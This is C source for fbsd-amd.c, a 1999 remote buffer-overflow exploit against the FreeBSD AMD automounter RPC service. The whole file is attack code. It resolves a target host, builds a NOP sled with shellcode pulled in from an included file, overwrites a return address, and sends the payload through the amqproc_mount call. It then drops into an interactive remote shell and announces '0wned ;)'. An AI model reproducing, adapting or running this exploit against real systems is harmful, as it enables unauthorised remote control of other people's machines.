/*
 *  ** PRIVATE ** DO NOT DISTRIBUTE ** PRIVATE ** DO NOT DISTRIBUTE **
 *
 *  Copyright (c) 1999 anathema <anathema@box.co.uk || djn@uk2.net>
 *  All rights reserved.
 *
 *  fbsd-amd.c
 *  This exploit code is a FreeBSD port of the previously released
 *  AMD exploit code for Linux (ex-amd.c).
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include "fbsd-code.c"
#include "amd.h"

#define ADDR			0xefbfd4b0
#define OFFSET			0
#define RETPOS			1005
#define PROG			300019
#define VERS			1

u_long
resolve_host(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;
    
    addr.s_addr = inet_addr(host_name);
    if (addr.s_addr == -1)
    {
	host_ent = gethostbyname(host_name);
	if (!host_ent) return(-1);
	memcpy((char *)&addr.s_addr, host_ent->h_addr, host_ent->h_length);
    }
    
    return(addr.s_addr);
}

void
interact(int sock)
{
    u_char sock_buf[4096];
    fd_set fds;
    
    fprintf(stderr, "0wned ;)\n");
    
    for (;;)
    {
	FD_ZERO(&fds);
	FD_SET(0, &fds);
	FD_SET(sock, &fds);
	
	select(255, &fds, NULL, NULL, NULL);
	memset(sock_buf, 0, sizeof(sock_buf));
	
	if (FD_ISSET(sock, &fds))
	{
	    read(sock, sock_buf, sizeof(sock_buf));
	    fprintf(stderr, "%s", sock_buf);
	}
	
	if (FD_ISSET(0, &fds))
	{
	    read(0, sock_buf, sizeof(sock_buf));
	    write(sock, sock_buf, strlen(sock_buf));
	}
    }
    
    /* NOTREACHED */
}

void
exploit_overflow(u_char *host_name, u_long dst_ip, u_char *buf)
{
    struct sockaddr_in sin;
    struct in_addr addr;
    struct timeval tv;
    CLIENT *clnt;
    u_char *ptr = buf;
    int sock = RPC_ANYSOCK;
    
    addr.s_addr = dst_ip;
    fprintf(stderr, "Attacking target `%s`.\n", inet_ntoa(addr));
    
    tv.tv_usec  = 0;
    tv.tv_sec   = 8;
    
    memset(&sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family  = AF_INET;
    sin.sin_addr.s_addr = dst_ip;
    
    clnt = clntudp_create(&sin, PROG, VERS, tv, &sock);
    if (!clnt)
    {
	perror("clntudp_create");
	exit(-1);
    }
    
    amqproc_mount_1(&ptr, clnt);
    clnt_destroy(clnt);
    
    interact(sock);
    
    /* NOTREACHED */
}

void
usage(u_char *nomenclature)
{
    fprintf(stderr, "No.\nusage:\t%s dst_ip [offset]\n", nomenclature);
    exit(-1);
}

int
main(int argc, char **argv)
{
    u_long addr, *ret, dst_ip;
    u_char buf[4096];
    int i = 0, j = 0, 
        retpos = RETPOS,
	offset = OFFSET;
	
    if (argc != 2 && argc != 3)
    {
	usage(argv[0]);
	/* NOTREACHED */
    }
    
    dst_ip = resolve_host(argv[1]);
    if (dst_ip == -1)
    {
	fprintf(stderr, "Invalid IP address `%s`.\n", argv[1]);
	exit(-1);
    }
    
    if (argc > 2)
    {
	offset = atoi(argv[2]);
	fprintf(stderr, "User specified offset: `%d`.\n", offset);
    }
    
    addr = ADDR + offset;
    fprintf(stderr, "----> 0x%lx\n", addr);
    
    memset(buf, 0x90, sizeof(buf));
    for (i = retpos - strlen(c0de); i < retpos; j++, i++)
    {
	buf[i] = c0de[j];
    }
    
    buf[retpos + 4] = 0;
    ret  = (u_long *)(buf + retpos);
    *ret = addr;
    
    exploit_overflow(argv[1], dst_ip, buf);
    
    /* NOTREACHED */
}

/* EOF */
